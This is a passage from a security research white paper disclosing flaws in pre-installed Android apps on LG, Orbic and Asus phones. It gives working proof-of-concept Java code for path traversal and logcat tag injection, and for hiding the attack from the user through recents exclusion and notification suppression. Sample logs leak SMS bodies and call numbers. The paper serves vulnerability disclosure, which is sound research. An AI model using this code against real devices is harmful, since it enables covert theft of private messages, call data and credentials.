25 http://www.blackhat.com/docs/asia-15/materials/asia-15-Johnson-Resurrecting-The-READ-LOGS-Permission-On-Samsung-
Devices-wp.pdf 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Below are the SHA-256 hashes for the com.lge.gnsslogcat app’s Android Package (APK) file and 
Optimized Dalvik EXecutable (ODEX) file. 
ec00172156d4032cbb4888def9509fc903674fe7d40467a5163b283d6d4967a8  GnssLogCat.apk 
3a8777a0c8256f5d3e953e9bba502b0842a5fe7656387f319fee0ba309fb8c1b  GnssLogCat.odex 
The com.lge.gnsslogcat app is small, as it only contains three classes for the whole app and only contains 
a single service application component: GnssLogService. This component is explicitly exported as it sets 
the android:exported attribute to a value of true. The com.lge.gnsslogcat app does not run following 
device startup and will only run when started by another app on the device. When the com.lge.gnsslogcat 
app is started via an intent, it will write the logcat log to external storage, although the log messages it writes 
belong to a limited set of log tags. Each log entry has a log tag and a log message. Specifically, the default 
configuration for the com.lge.gnsslogcat app is to only record log messages that have a log tag of 
GpsLocationProvider, LocationManagerService, or GnssLogService. Under the default configuration, 
the com.lge.gnsslogcat app writes the entire log entries for log messages from the system-wide logcat 
log that have the aforementioned log tags to a default path of /sdcard/gnsslog/GnssLogService.log. 
An example listing of this file is shown below. 
05-10 13:16:24.559  1703  2555 D LocationManagerService: getLastLocation: 
Request[ACCURACY_FINE gps requested=0 fastest=0 num=1] 
05-10 13:16:24.560  1703  1717 D LocationManagerService: getLastLocation: Request[POWER_LOW 
network requested=0 fastest=0 num=1] 
05-10 13:16:39.131  6668  6685 D GnssLogService: FileName[GnssLogService] start logging 
05-10 13:17:34.930  1703  3307 D LocationManagerService: getLastLocation: Request[POWER_NONE 
passive fastest=0 num=1] 
05-10 13:17:34.940  1703  3345 D LocationManagerService: getLastLocation: Request[POWER_NONE 
passive fastest=0 num=1] 
05-10 13:17:34.949  1703  3307 D LocationManagerService: getLastLocation: Request[POWER_NONE 
passive fastest=0 num=1] 
The logcat log, containing only log entries from 3 specific log tags, only provides a very limited amount of 
data. We discovered a method to provide input to the com.lge.gnsslogcat app so that the entire system-
wide logcat log will be written to the output file. The attacking app that starts the com.lge.gnsslogcat 
app externally can control the path where the file will be created. Moreover, the attacker can use a path 
traversal attack. The resulting log file will always have a fixed .log extension, but the path can be controlled 
by the attacker. The path selection will still be subject to SELinux rules. We have found that the attacking 
app can successfully cause the com.lge.gnsslogcat app create a logcat log file in the attacking app’s 
private directory. Therefore, the attacking app does not require any permissions to obtain the logcat logs, 
although if data from the logcat log is to be sent off from the device, the attacking app will need the 
INTERNET permission. 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Here we provide the source code to perform the attack using a notional package name of hab.huba. The 
first thing the attacking app needs to do is to make its private directory (i.e., /data/data/hab.huba) 
globally executable. This source code below will accomplish this.  
File baseAppDir = getFilesDir().getParentFile(); 
baseAppDir.setExecutable(true, false); 
After that, the attacking app needs to create a file in their private directory. The name can be anything 
although it will have to end in .log and the same file name (except the .log since it will be appended by 
the com.lge.gnsslogcat app) will need to be used when sending an intent to the com.lge.gnsslogcat 
app to start the logging. Using an example file name of test.txt.log, we will create it in the attacking 
app’s private directory.  
File logfile = new File(baseAppDir, "test.txt.log"); 
try { 
    logfile.createNewFile(); 
    logfile.setWritable(true, false); 
} catch (IOException e) { 
    e.printStackTrace(); 
} 
This code will create an empty file in the attacking app’s private directory that will be writable by the 
com.lge.gnsslogcat app. The SELinux rules allow the com.lge.gnsslogcat app to write (although not 
read) from a third-party app’s private directory. The attacking app, hab.huba, will be the owner of the 
test.txt.log file even after the com.lge.gnsslogcat app writes logcat log data to it. Below is the code 
the attacking app will execute to initiate the writing of the logcat log file in its private directory to a file of 
its choosing. 
Intent i = new Intent("com.lge.gnsslogcat"); 
i.setClassName("com.lge.gnsslogcat", "com.lge.gnsslogcat.GnssLogService"); 
i.putExtra("modulename", "GnssLogService"); 
i.putExtra("start", true); 
i.putExtra("logfilename", "../../../../data/data/hab.huba/test.txt"); 
ArrayList darkness = new ArrayList(); 
darkness.add("*:V Hidden"); 
i.putStringArrayListExtra("tags", darkness); 
startService(i); 
The logfilename extra used in the intent controls the file name, but it can also be used to control the file 
path as there is no input filtering to prevent a directory traversal attack. If the attacking app just provides a 
file name without a path, the default path is /storage/emulated/0/gnsslog. Therefore, the attacking app 
can escape these directories and provide a path that will resolve to an already created file that is owned by 
the attacking app and resides in the attacking app’s private directory. Normally, the com.lge.gnsslogcat 
app will only write messages corresponding to three different log tags, but the attacking app can provide 
input to the logcat command executed by the com.lge.gnsslogcat app so that all messages (i.e., any log 
tag with any log level) will be contained in the file. The com.lge.gnsslogcat app will check for an 
ArrayList object in the intent that corresponds to a key name of tags. This allows an app to 
specify additional log tags that will be used in the logcat command. The attacking app can provide specific 
log tags it is interested in, although a more convenient approach is just to obtain them all, as it may be 
difficult to know all the interesting log tags on the device a priori. When using logcat command, the 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
initiating process can specify specific log tags and the accompanying log level (and up) that should be 
included and silence everything else (effectively white-listing what should be included). 
The com.lge.gnsslogcat app when executing normally will execute the logcat command below. 
logcat -v threadtime -s GpsLocationProvider:V LocationManagerService:V GnssLogService:V 
Whenever there are strings in the ArrayList object corresponding to the a key name of tags 
passed in the intent, it will take each String and append a :V to the end of it and add it to the end of the 
command above. Therefore, the attacking app has some control over parameters to the command, although 
the attacking app cannot perform arbitrary command injection due to the way Java executes a single 
command using Runtime.exec(String) API call. The appending of :V to the a specific log tag just makes 
it so that any message with that log tag at the level of verbose or above will be included. The -s argument 
will silence all other log tags that are not explicitly included as arguments. To obtain all the log entries (all 
log tags at all levels), a String of *:V Hidden is provided to the ArrayList object corresponding 
to the a key name of tags in the intent. The *:V is a wildcard that matches any log tag at the lowest log 
level which will match the lowest level and all levels above (i.e., every possible log message). Since the 
com.lge.gnsslogcat.GnssLogCat class iterates over the Strings that were provided in the 
ArrayList object and appends a :V to the end, a space and arbitrary word (i.e., *:V Hidden) is 
provided in the input to keep the command proper. Therefore, the command that the GnssLogCat class 
executes will be the following. 
logcat -v threadtime -s GpsLocationProvider:V LocationManagerService:V GnssLogService:V *:V 
Hidden:V 
This command will execute and write all available log data to the file it was instructed to by the attacking 
app. The com.lge.gnsslogcat.GnssLogFileManager class will create the log file (if it does not exist) 
and write the file using a java.io.FileOutpstream wrapped in a java.io.OutputStreamWriter object. 
The path is controlled by the attacker and contained in the intent belonging to a key value of logfilename. 
The result is that the attacking app now has the com.lge.gnsslogcat app writing the system-wide logcat 
log to a file it owns in its private directory. 
5.2 Orbic Wonder – Logcat Logs 
The Orbic Wonder26 Android device provides a method to obtain the logcat logs via a pre-installed platform 
app with a package name of com.ckt.mmitest (versionCode=25, versionName=7.1.2) that will write the 
logcat logs to the SD card when a specific activity is started. Any app that requests the 
READ_EXTERNAL_STORAGE permission can read from the SD card and also the created logcat log file. 
Therefore, a local app on the device can quickly start a specific activity application component 
(com.ckt.mmitest.MmiMainActivity) in the app (com.ckt.mmitest) to have the logcat log get written 
to 
the 
SD 
card. 
After 
starting 
the 
app 
with 
a 
specific 
flag 
in 
the 
intent 
(FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS), the app can programmatically return to the home screen and 
the app (com.ckt.mmitest) will not be visible in the recent apps. Then the logcat log will be continually 
written and can be mined on the device for sensitive user data. Alternatively, the entire log file can be 
exfiltrated to a remote location for processing. An example file path that the logs get written to is 
26 http://www.orbic.us/phones/details/10 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
/sdcard/MmiTest/fd5d9b82_0202-221453.log. This file name may vary, but the directory will be the 
same. The source code below will initiate the writing of the logcat log file to external storage. The first 
intent will start the activity application component which initiates the writing of the logcat log to the SD 
card. This intent contains a flag that will hide it from the recent apps list. The thread then sleeps 0.7 seconds. 
Then it launches an intent to return to the home screen, so the app is no longer visible or accessible to the 
user via the recent apps list. This can be done in the background from a service application component. 
Intent i = new Intent(); 
i.setClassName("com.ckt.mmitest", "com.ckt.mmitest.MmiMainActivity"); 
i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); 
this.startActivity(i); 
try { 
    Thread.sleep(700); 
} catch (InterruptedException e) { 
    e.printStackTrace(); 
} 
Intent i2 = new Intent("android.intent.action.MAIN"); 
i2.addCategory(Intent.CATEGORY_HOME); 
startActivity(i2); 
The default messaging app, com.android.mms (versionCode=25, versionName=7.1.2), on the Orbic 
Wonder device writes call data and the body of sent and received text messages to the logcat log. This is an 
insecure practice since it is unnecessary to write this data to the logcat log on a production device due to 
the possibility of the logcat log being exposed. The system_server process writes the call data to the logcat 
log. Using the ability to obtain the logcat log above, this will enable an app on the device to obtain the body 
of the user’s sent and received text messages, as well as call data as they occur. Additional data may be 
written to the logcat logs, although we are focusing here on the telephony data. 
Sent text messages (destination number and body of text message) 
02-02 21:51:22.654  6538  6719 D Mms-debug: sendMessage sendIntent: Intent { 
act=com.android.mms.transaction.MESSAGE_SENT dat=content://sms/1 
cmp=com.android.mms/.transaction.SmsReceiver (has extras) } 
02-02 21:51:22.657  6538  6719 D Mms-debug: 
sendMultipartTextMessage:mDest=5716667157|mServiceCenter=null|messages=I am sending a text 
message|mPriority=-1|isExpectMore=false|validityPeriod=-
1|threadId=1|uri=content://sms/1|msgs.count=1|token=-1|mSubId=1|mRequestDeliveryReport=false 
Received text messages (sending number and body of text message) 
02-02 21:53:32.149  6538  6538 D Mms-debug: mWorkingMessage send mDebugRecipients=(571) 666-
7157 
02-02 21:53:32.149  6538  6538 D Mms-debug: send origThreadId: 1 
02-02 21:53:32.149  6538  6538 D Mms-debug: mText=Receiving a text message 
Placing a call 
02-02 21:54:40.663  1348  1348 I Telecom : Class:  processOutgoingCallIntent isCallPull = 
false: PCR.oR@AFA02-02 21:54:40.663  1348  1348 I Telecom : Class:  processOutgoingCallIntent 
handle = tel:(571)%20666-7157,scheme = tel, uriString = (571) 666-7157, isSkipSchemaParsing = 
false, isAddParticipant = false: PCR.oR@AFA 
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | PI:EMAIL 
Receiving a call 
02-02 21:58:00.351  1348  1348 D PhonecallDetector: onIncomingCallReceived() number: 
+15716667157 start at: Fri Feb 02 21:58:00 EST 2018 
02-02 21:54:41.569  1348  1348 D PhonecallDetector: onOutgoingCallStarted() number: 5716667157 
start at: Fri Feb 02 21:54:41 EST 2018 
02-02 21:54:54.844  1348  1348 D PhonecallDetector: onOutgoingCallEnded() number: 5716667157 
start at: Fri Feb 02 21:54:41 EST 2018 end at: Fri Feb 02 21:54:54 EST 2018 
5.3 Asus ZenFone 3 Max – Obtaining the Logcat Logs, WiFi Passwords and More 
The Asus ZenFone 3 Max Android device contains a pre-installed app with a package name of 
com.asus.loguploader (versionCode=1570000275, 
versionName=7.0.0.55_170515) with an 
exported interface that allows any app on the phone to obtain a dumpstate file (kernel log, logcat log, dump 
of system services, which includes text of active notifications), Wi-Fi Passwords, and other system data 
that 
gets 
written 
to 
external 
storage. 
The 
build 
fingerprint 
of 
the 
device 
is 
asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-20171208:user/release-
keys. In addition, the phone numbers for outgoing and incoming telephone calls get written to the logcat 
log, as well as the telephone numbers for outgoing and incoming text messages. Therefore, having access 
to the logcat log (via the dumpstate file), allows one to also obtain some telephony meta-data. 
The 
com.asus.loguploader 
app 
has 
an 
exported 
component 
named 
com.asus.loguploader.LogUploaderService. This component can be accessed by an app on the device 
to generate the log files that get written to external storage. Once an app interacts with it using a specific 
intent, the device will vibrate once and create two notifications: one that says “Log generating… Please 
wait for a while” and another that says “Bug Reporter is running. Tap for more information or to stop the 
app.” The device will vibrate again when the generation of the log files has completed. These two 
notifications are temporary and will be removed in around one second since a second intent is sent. 
The com.asus.loguploader app cannot be disabled through the Settings app. The source code to write 
the log data to the SD card is provided below. The first intent is to start the log generation and the second 
intent is to quickly remove the notifications. If the second intent was not sent, the generation of log files 
would leave notifications in the status bar for the user to see. The second intent is sent to remove the 
notifications. 
Intent i = new Intent("MANUAL_UPLOAD"); 
i.setClassName("com.asus.loguploader", "com.asus.loguploader.LogUploaderService"); 
startService(i); 
Intent i2 = new Intent("MOVELOG_COMPLETED"); 